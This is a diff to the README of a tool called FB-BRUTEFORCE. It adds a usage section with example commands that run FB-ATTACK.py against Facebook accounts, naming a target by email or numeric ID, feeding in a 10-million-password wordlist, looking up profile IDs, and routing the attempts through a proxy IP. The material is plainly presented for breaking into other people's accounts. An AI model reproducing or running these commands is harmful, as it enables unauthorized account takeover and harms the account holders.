@@ -52,6 +52,21 @@ cd FB-BRUTEFORCE
 python FB-ATTACK.py
 ```
 
+## Usage
+   ```
+       Usage: python FB-ATTACK.py [OPTIONS...]
+Examples:
+     |-------->
+     | python FB-ATTACK.py -t target@gmail.com -w /home/user/FB-BRUTEFORCE/10MPASS.txt
+     |-------->
+     | python FB-ATTACK.py -g https://www.facebook.com/target_profile_url_for_get_id
+     |-------->
+     | python FB-ATTACK.py -t 100001013078780 -w /home/user/FB-BRUTEFORCE/10MPASS.txt 
+     |-------->
+     |python FB-ATTACK.py -t target@hotmail.com -w D:\\PASS.txt -p 168.119.108.245:8069  
+     |-------->
+```
+
 ***
 #### ➡️To use the FB-BRUTEFORCE type the following commands in linux
 
